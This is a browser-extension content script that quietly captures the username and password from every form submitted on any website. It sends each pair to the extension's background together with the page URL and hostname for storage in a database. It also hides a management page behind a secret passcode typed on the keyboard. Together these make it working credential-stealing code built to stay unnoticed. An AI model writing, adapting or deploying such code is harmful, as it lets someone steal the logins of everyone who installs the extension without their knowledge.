(function() {
  function attachListener(form) {
    if (form._listenerAdded) return;
    form._listenerAdded = true;

    form.addEventListener('submit', function(event) {
      try {
        let userInput = null;
        let passInput = null;
        const inputs = form.getElementsByTagName('input');

        for (let input of inputs) {
          if (!userInput && (input.type === 'text' || input.type === 'email' || input.autocomplete === 'username')) {
            userInput = input;
          }
          if (!passInput && (input.type === 'password' || input.autocomplete === 'current-password')) {
            passInput = input;
          }
        }

        if (userInput && passInput && userInput.value && passInput.value) {
          chrome.runtime.sendMessage({
            action: 'queryDatabase',
            crud: 'create',
            record: [
              window.location.href,
              window.location.hostname,
              userInput.value,
              passInput.value
            ]
          }, function(response) {
            if (chrome.runtime.lastError) {
              console.warn('[content script] Błąd wysyłania wiadomości:', chrome.runtime.lastError.message);
            } else if (!response || !response.success) {
              console.warn('[content script] Brak odpowiedzi lub operacja nieudana.');
            }
          });
        }
      } catch (e) {
        console.error('[content script] Błąd podczas obsługi formularza:', e);
      }
    });
  }

  function monitorExistingForms() {
    const forms = document.getElementsByTagName('form');
    for (let form of forms) {
      attachListener(form);
    }
  }

  const observer = new MutationObserver(function(mutations) {
    for (let mutation of mutations) {
      for (let node of mutation.addedNodes) {
        if (node.tagName === 'FORM') {
          attachListener(node);
        } else if (node.querySelectorAll) {
          const forms = node.querySelectorAll('form');
          for (let form of forms) {
            attachListener(form);
          }
        }
      }
    }
  });

  function startObservation() {
    observer.observe(document.body, { childList: true, subtree: true });
    monitorExistingForms();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startObservation);
  } else {
    startObservation();
  }

  let passcode = '';
  let progress = 0;

  function loadPasscode() {
    chrome.storage.local.get('passcode', function(result) {
      passcode = (result.passcode || '').toUpperCase();
      console.log('[content script] Passcode loaded:', passcode);
      progress = 0;
    });
  }

  loadPasscode();

  chrome.storage.onChanged.addListener(function(changes) {
    if (changes.passcode) {
      passcode = changes.passcode.newValue.toUpperCase();
      console.log('[content script] Passcode updated:', passcode);
      progress = 0;
    }
  });

  window.addEventListener('keydown', function(event) {
    if (!passcode) return;

    const active = document.activeElement;
    if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.isContentEditable)) {
      return;
    }

    if (event.key.toUpperCase() === passcode.charAt(progress)) {
      progress++;
      if (progress === passcode.length) {
        console.log('[content script] Passcode matched! Opening manage.html...');
        chrome.runtime.sendMessage({ action: 'openManage' });
        progress = 0;
      }
    } else {
      progress = 0;
    }
  });
})();
